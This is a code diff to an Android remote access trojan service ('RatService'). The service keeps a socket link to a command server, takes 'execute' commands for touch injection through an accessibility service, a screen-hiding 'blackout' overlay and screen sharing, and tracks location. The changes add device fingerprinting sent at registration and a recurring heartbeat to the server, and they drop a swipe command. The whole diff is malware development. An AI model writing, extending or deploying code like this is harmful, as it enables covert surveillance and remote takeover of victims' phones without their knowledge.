@@ -4,8 +4,11 @@ import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
+import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
+import android.os.BatteryManager;
 import android.os.Build;
 import android.os.IBinder;
 import android.util.Log;
@@ -33,7 +36,6 @@ public class RatService extends Service {
         super.onCreate();
         deviceId = getDeviceId();
         startForeground(1, buildNotification());
-
         ScreenShareService.deviceId = deviceId;
 
         locationModule = new LocationModule(this, (lat, lon) -> {
@@ -69,6 +71,39 @@ public class RatService extends Service {
         return id;
     }
 
+    private int getBatteryLevel() {
+        try {
+            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
+            Intent batteryStatus = registerReceiver(null, ifilter);
+            if (batteryStatus != null) {
+                int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
+                int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
+                if (level >= 0 && scale > 0) {
+                    return (int) ((level / (float) scale) * 100);
+                }
+            }
+        } catch (Exception ignored) {}
+        return 0;
+    }
+
+    private String getDeviceModel() {
+        String manufacturer = Build.MANUFACTURER;
+        String model = Build.MODEL;
+        if (model.toLowerCase().startsWith(manufacturer.toLowerCase())) {
+            return capitalize(model);
+        }
+        return capitalize(manufacturer) + " " + model;
+    }
+
+    private String capitalize(String s) {
+        if (s == null || s.isEmpty()) return "";
+        return s.substring(0, 1).toUpperCase() + s.substring(1);
+    }
+
+    private String getAndroidVersion() {
+        return Build.VERSION.RELEASE;
+    }
+
     private Notification buildNotification() {
         String CH = "pris_svc";
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -91,14 +126,8 @@ public class RatService extends Service {
 
             socket.on(Socket.EVENT_CONNECT, args -> {
                 Log.d(TAG, "Connected");
-                try {
-                    JSONObject reg = new JSONObject();
-                    reg.put("id", deviceId);
-                    reg.put("model", Build.MANUFACTURER + " " + Build.MODEL);
-                    reg.put("android", Build.VERSION.RELEASE);
-                    reg.put("battery", 100);
-                    socket.emit("register", reg);
-                } catch (Exception ignored) {}
+                sendDeviceInfo();
+                startHeartbeat();
             });
 
             socket.on("execute", args -> {
@@ -115,6 +144,37 @@ public class RatService extends Service {
         } catch (URISyntaxException e) {
             Log.e(TAG, "URI error", e);
         }
+    }
+
+    private void sendDeviceInfo() {
+        try {
+            JSONObject reg = new JSONObject();
+            reg.put("id", deviceId);
+            reg.put("model", getDeviceModel());
+            reg.put("android", getAndroidVersion());
+            reg.put("battery", getBatteryLevel());
+            socket.emit("register", reg);
+            Log.d(TAG, "Registered: " + getDeviceModel() + " | " + getBatteryLevel() + "%");
+        } catch (Exception e) {
+            Log.e(TAG, "Reg error", e);
+        }
+    }
+
+    private void startHeartbeat() {
+        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                if (socket != null && socket.connected()) {
+                    try {
+                        JSONObject hb = new JSONObject();
+                        hb.put("id", deviceId);
+                        hb.put("battery", getBatteryLevel());
+                        socket.emit("heartbeat", hb);
+                    } catch (Exception ignored) {}
+                }
+                startHeartbeat();
+            }
+        }, 30000);
     }
 
     private void handleCommand(String action, JSONObject cmd) {
@@ -135,13 +195,6 @@ public class RatService extends Service {
                 float ry = (float) cmd.optDouble("y", 0);
                 boolean relative = cmd.optBoolean("relative", false);
                 handleTouch(rx, ry, relative);
-                break;
-            case "swipe":
-                PrisAccessibility.performSwipe(
-                    (float) cmd.optDouble("x1", 0),
-                    (float) cmd.optDouble("y1", 0),
-                    (float) cmd.optDouble("x2", 0),
-                    (float) cmd.optDouble("y2", 0));
                 break;
             case "blackout":
                 startService(new Intent(this, OverlayService.class));
